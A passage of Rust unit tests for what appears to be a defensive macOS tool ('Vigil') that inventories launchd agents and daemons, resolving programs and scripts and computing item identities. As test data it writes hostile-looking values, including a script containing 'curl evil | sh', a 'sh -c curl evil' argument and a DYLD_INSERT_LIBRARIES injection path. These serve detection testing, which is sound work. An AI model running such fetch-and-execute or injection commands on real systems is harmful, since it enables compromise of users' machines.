        assert!(matches!(ran.signature, Signature::Unsigned { .. }));
        assert!(item.keep_alive && !item.run_at_load && !item.disabled);
        assert_eq!(item.environment["API_TOKEN"], None);
        assert_eq!(
            item.environment["DYLD_INSERT_LIBRARIES"].as_deref(),
            Some("/tmp/x.dylib")
        );
        assert_eq!(
            item.environment["PATH"].as_deref(),
            Some("/tmp/bin:/usr/bin")
        );
        let line = serde_json::to_string(&item).unwrap();
        assert!(!line.contains("secret"), "{line}");
        assert!(line.contains(r#""kind":"launch_daemon""#), "{line}");
    }

    #[test]
    fn a_script_is_found_past_options_but_not_after_inline_code() {
        let tmp = tempfile::tempdir().unwrap();
        let script = tmp.path().join("x.py");
        fs::write(&script, "print(1)\n").unwrap();
        let file = script.to_str().unwrap();
        let ran = |arguments: &[&str]| {
            job(tmp.path(), "s.plist", arguments, "")
                .script
                .map(|s| s.path)
        };

        assert_eq!(ran(&["/usr/bin/python3", "-u", file]), Some(script.clone()));
        assert_eq!(
            ran(&["/usr/bin/env", "python3", file]),
            Some(script.clone())
        );
        assert_eq!(ran(&["/bin/bash", "-l", file]), Some(script.clone()));
        assert_eq!(
            ran(&["/usr/bin/osascript", "-l", "JavaScript", file]),
            Some(script.clone())
        );
        assert_eq!(ran(&["/bin/sh", "-c", file]), None);
        assert_eq!(ran(&["/bin/bash", "-lc", file]), None);
        assert_eq!(ran(&["/bin/ls", file]), None, "not an interpreter");
        assert!(is_interpreter(Path::new("/opt/homebrew/bin/python3.12")));
        assert!(!is_interpreter(Path::new("/bin/ls")));
    }

    #[test]
    fn the_identity_changes_with_anything_that_changes_what_runs() {
        let tmp = tempfile::tempdir().unwrap();
        let dir = tmp.path();
        let script = dir.join("run.sh");
        fs::write(&script, "hello\n").unwrap();
        let file = script.to_str().unwrap();
        let identity =
            |arguments: &[&str], extra: &str| job(dir, "i.plist", arguments, extra).identity();
        let base = identity(&["/bin/sh", file], "");

        assert_eq!(base, identity(&["/bin/sh", file], ""));
        assert_ne!(base, identity(&["/bin/zsh", file], ""), "another program");
        assert_ne!(base, identity(&["/bin/sh", "-x", file], ""), "arguments");
        let as_nobody = "<key>UserName</key><string>nobody</string>";
        assert_ne!(base, identity(&["/bin/sh", file], as_nobody), "the user");
        let at_load = "<key>RunAtLoad</key><true/>";
        assert_ne!(base, identity(&["/bin/sh", file], at_load), "run at load");
        let dyld = "<key>EnvironmentVariables</key><dict>\
                    <key>DYLD_INSERT_LIBRARIES</key><string>/tmp/a.dylib</string></dict>";
        assert_ne!(base, identity(&["/bin/sh", file], dyld), "DYLD_");
        // `true` ignores `-c` and `sh` runs it: the same arguments under another program.
        assert_ne!(
            identity(&["/usr/bin/true", "-c", "curl evil"], ""),
            identity(&["/bin/sh", "-c", "curl evil"], "")
        );
        fs::write(&script, "curl evil | sh\n").unwrap();
        assert_ne!(base, identity(&["/bin/sh", file], ""), "the script");
    }

    #[test]
    fn a_property_list_that_cannot_be_read_is_an_item_with_its_error() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("broken.plist");
        fs::write(&path, "not a plist").unwrap();
        let item = read(ItemKind::UserLaunchAgent, &path);
        let error = item.error.as_deref().unwrap();
        assert!(error.starts_with("not a launchd property list"), "{error}");
        assert!(item.program.is_none());
        // Changing it changes the identity, so a dismissed one shows again.
        let before = item.identity();
        fs::write(&path, "still not a plist").unwrap();
        assert_ne!(before, read(ItemKind::UserLaunchAgent, &path).identity());

        // A link or a FIFO is refused when opened, so a swap cannot block the read.
        let link = tmp.path().join("link.plist");
        std::os::unix::fs::symlink(&path, &link).unwrap();
        let fifo = tmp.path().join("fifo.plist");
        paths::releasing_fifo(&fifo);
        for refused in [link, fifo] {
            let item = read(ItemKind::UserLaunchAgent, &refused);
            assert!(
                item.error
                    .as_deref()
                    .unwrap()
                    .starts_with("not a regular file"),
                "{item:?}"
            );
        }

        let empty = plist(tmp.path(), "empty.plist", "");
        let item = read(ItemKind::LaunchAgent, &empty);
        assert!(item.error.is_none() && item.program.is_none());
    }

    #[test]
    fn programs_resolve_as_launchd_resolves_them() {
        let tmp = tempfile::tempdir().unwrap();
        let item = job(tmp.path(), "old.plist", &["/nonexistent/old-app"], "");
        assert_eq!(item.program.unwrap().signature, Signature::Missing);

        // A relative path is under the job's WorkingDirectory, never Vigil's own folder.
        let extra = format!(
            "<key>WorkingDirectory</key><string>{}</string>",
            tmp.path().display()
        );
        let item = job(tmp.path(), "rel.plist", &["bin/tool"], &extra);
        assert_eq!(item.program.unwrap().path, tmp.path().join("bin/tool"));
        let item = job(tmp.path(), "rel.plist", &["bin/tool"], "");
        assert!(matches!(
            item.program.unwrap().signature,
            Signature::Unreadable { detail, .. } if detail.starts_with("a relative path")
        ));

        assert_eq!(resolve("ls", None), Path::new("/bin/ls"));
        assert_eq!(resolve("/opt/x", Some("/tmp")), Path::new("/opt/x"));
        assert_eq!(resolve("no-such-tool", None), Path::new("no-such-tool"));
    }

    #[test]
    fn folders_that_are_missing_are_empty_and_unlistable_ones_are_noted() {
        let tmp = tempfile::tempdir().unwrap();
        let locked = tmp.path().join("locked");
        fs::create_dir(&locked).unwrap();
        plist(&locked, "a.plist", "");
        fs::set_permissions(&locked, fs::Permissions::from_mode(0o000)).unwrap();
        let open = tmp.path().join("open");
        fs::create_dir(&open).unwrap();
        plist(&open, "b.plist", "");
        fs::write(open.join(".DS_Store"), "").unwrap();

        let mut inventory = Inventory::default();
        let folders = [
            (ItemKind::LaunchAgent, tmp.path().join("missing")),
            (ItemKind::LaunchAgent, locked.clone()),
            (ItemKind::UserLaunchAgent, open.clone()),
        ];
        let items = launch_items(&mut inventory, &folders, &Cancel::new());
        fs::set_permissions(&locked, fs::Permissions::from_mode(0o755)).unwrap();

        let paths: Vec<&str> = items.iter().map(|i| i.path.as_str()).collect();
        assert_eq!(paths, [open.join("b.plist").to_str().unwrap()]);
        // A folder this user may not read is a note, as everywhere in the inventory: it stays
        // so on every sweep, and counting it would keep this Mac from ever being clear.
        assert_eq!(inventory.problems.len(), 1, "{:?}", inventory.problems);
        assert!(inventory.failed.is_empty());

        // A cancelled read stops before the next item and counts as not checked.
        let cancel = Cancel::new();
        cancel.cancel();
        let mut inventory = Inventory::default();
        let folders = [(ItemKind::UserLaunchAgent, open.clone())];
        assert!(launch_items(&mut inventory, &folders, &cancel).is_empty());
        assert!(inventory.failed.contains(&InventorySource::LaunchItems));
    }

    #[test]
    fn host_files_and_keys_come_from_what_was_read() {
        let tmp = tempfile::tempdir().unwrap();
        let path = plist(tmp.path(), "a.plist", "");
        let item = read(ItemKind::LaunchAgent, &path);
        let identity = item.identity();
        let settings = BTreeMap::from([("filevault", "FileVault is On.".to_owned())]);
        let host = Host::new(&settings, &[item]);

        assert_eq!(host.settings, ["filevault"]);
        assert_eq!(host.items[path.to_str().unwrap()], identity);
        let names: Vec<&str> = host.files.iter().map(|(n, _)| n.as_str()).collect();
        assert_eq!(names, ["mac/settings.json", "mac/persistence.jsonl"]);
        assert!(host.files[0].1.contains("FileVault is On."));
        assert_eq!(host.files[1].1.lines().count(), 1);
    }
}
